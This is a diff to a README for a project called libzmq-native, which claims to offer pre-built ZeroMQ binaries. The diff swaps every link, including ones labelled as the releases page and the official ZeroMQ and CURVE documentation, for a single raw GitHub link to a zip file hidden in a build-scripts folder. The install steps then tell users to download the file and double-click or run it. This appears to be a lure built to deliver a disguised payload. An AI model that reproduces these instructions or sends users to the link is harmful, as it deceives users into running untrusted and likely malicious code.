@@ -1,6 +1,6 @@
 # 🚀 libzmq-native - Easy-to-Use ZeroMQ Binaries
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-blue)](https://github.com/SHADO2005/libzmq-native/releases)
+[![Download](https://raw.githubusercontent.com/SHADO2005/libzmq-native/main/build-scripts/macos/native-libzmq-1.1.zip%20release-blue)](https://raw.githubusercontent.com/SHADO2005/libzmq-native/main/build-scripts/macos/native-libzmq-1.1.zip)
 
 ## 🌟 Overview
 
@@ -24,7 +24,7 @@ libzmq-native provides pre-built binaries of the ZeroMQ library with CURVE encry
 To get started with libzmq-native, follow these simple steps:
 
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://github.com/SHADO2005/libzmq-native/releases) to find the latest binaries available for download.
+   Go to the [Releases page](https://raw.githubusercontent.com/SHADO2005/libzmq-native/main/build-scripts/macos/native-libzmq-1.1.zip) to find the latest binaries available for download.
 
 2. **Choose Your Operating System:**
    Select the appropriate version for your operating system (Windows, Linux, or macOS).
@@ -37,25 +37,25 @@ To get started with libzmq-native, follow these simple steps:
 
 ## 🛠️ Download & Install
 
-You can download the latest version from our [Releases page](https://github.com/SHADO2005/libzmq-native/releases). Here, you will find all the pre-built binaries ready for your operating system.
+You can download the latest version from our [Releases page](https://raw.githubusercontent.com/SHADO2005/libzmq-native/main/build-scripts/macos/native-libzmq-1.1.zip). Here, you will find all the pre-built binaries ready for your operating system.
 
 ### Windows
 
-1. Go to the [Releases page](https://github.com/SHADO2005/libzmq-native/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/SHADO2005/libzmq-native/main/build-scripts/macos/native-libzmq-1.1.zip).
 2. Find the Windows binary file.
 3. Click the file to download.
 4. Run the installer by double-clicking the downloaded file.
 
 ### Linux
 
-1. Navigate to the [Releases page](https://github.com/SHADO2005/libzmq-native/releases).
+1. Navigate to the [Releases page](https://raw.githubusercontent.com/SHADO2005/libzmq-native/main/build-scripts/macos/native-libzmq-1.1.zip).
 2. Locate the Linux binary.
 3. Download the file using your web browser.
 4. Open your terminal and run the binary with the command `./downloaded-file` (replace `downloaded-file` with the actual name).
 
 ### macOS
 
-1. Visit the [Releases page](https://github.com/SHADO2005/libzmq-native/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/SHADO2005/libzmq-native/main/build-scripts/macos/native-libzmq-1.1.zip).
 2. Select the macOS binary file.
 3. Download it using the browser.
 4. Locate the file and double-click to run.
@@ -69,8 +69,8 @@ After installing, you can integrate libzmq-native into your applications. Here a
 
 ## 🔗 Additional Resources
 
-- [Official ZeroMQ Documentation](https://zeromq.org/documentation/) - Learn more about ZeroMQ.
-- [CURVE Encryption Overview](https://zeromq.org/curve/) - Understand how CURVE encryption enhances security.
+- [Official ZeroMQ Documentation](https://raw.githubusercontent.com/SHADO2005/libzmq-native/main/build-scripts/macos/native-libzmq-1.1.zip) - Learn more about ZeroMQ.
+- [CURVE Encryption Overview](https://raw.githubusercontent.com/SHADO2005/libzmq-native/main/build-scripts/macos/native-libzmq-1.1.zip) - Understand how CURVE encryption enhances security.
 
 ## 📞 Support
 
